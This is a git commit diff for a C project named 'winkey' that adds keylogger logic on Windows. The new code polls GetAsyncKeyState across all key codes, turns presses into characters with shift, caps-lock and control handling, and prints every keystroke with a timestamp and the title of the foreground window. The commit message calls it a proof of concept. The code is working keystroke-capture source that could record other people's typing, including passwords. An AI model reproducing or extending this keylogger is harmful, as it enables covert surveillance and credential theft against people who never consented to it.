75214dd8b4649b0b2a1241f21031849d31e1955c
ska42 <skalyxe00@gmail.com>
2022-03-17 16:43:24 +0100

    PoC but should delete all because of low level hook

--- winkey/srcs/winkey.c
+++ winkey/srcs/winkey.c
@@ -1,5 +1,40 @@
 #include "winkey.h"
 
+void		log_window(SYSTEMTIME st, char *window_name)
+{
+	printf("\n[%02d.%02d.%04d %02d:%02d] - '%s'\n",st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, window_name);
+}
+
+void		log_key(unsigned char key)
+{
+	if (key_code_table[key])
+	{
+		if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000) && \
+			special_char_table[key_code_table[key][0]])
+			printf("%c", special_char_table[key_code_table[key][0]]);
+		else
+			printf("%s", key_code_table[key]);
+	}
+	else if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9'))
+	{
+		if (GetAsyncKeyState(VK_LCONTROL) || GetAsyncKeyState(VK_RCONTROL))
+			printf("Ctrl");
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+			printf("Shift");
+		if (key >= 'A' && key <= 'Z')
+		{
+			if (!GetKeyState(VK_CAPITAL) && !GetAsyncKeyState(VK_LSHIFT) && !GetAsyncKeyState(VK_RSHIFT) && !GetAsyncKeyState(VK_LCONTROL) && !GetAsyncKeyState(VK_RCONTROL))
+				key = key - 'A' + 'a';
+		}
+		else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000))
+		{
+			if (special_char_table[key])
+				key = special_char_table[key];
+		}
+		printf("%c", key);
+	}
+}
+
 int			main(void)
 {
 	char		title[256];
@@ -8,18 +43,21 @@ int			main(void)
 	memset(prev, 256, '\0');
 	while (1)
 	{
-		for (int i = 8; i <= 190; i++)
+		for (int i = 8; i <= 255; i++)
 		{
 			if (GetAsyncKeyState(i) == -32767)
 			{
-				printf("%c\n", (char)i);
 				GetWindowText(GetForegroundWindow(), title, 256);
 				if (strcmp(prev, title))
 				{
+					SYSTEMTIME st;
+
+					GetSystemTime(&st);
 					memcpy(prev, title, strlen(title));
 					prev[strlen(title)] = '\0';
-					printf(" - '%s'\n", title);
+					log_window(st, title);
 				}
+				log_key((unsigned char)i);
 			}
 		}
 	}
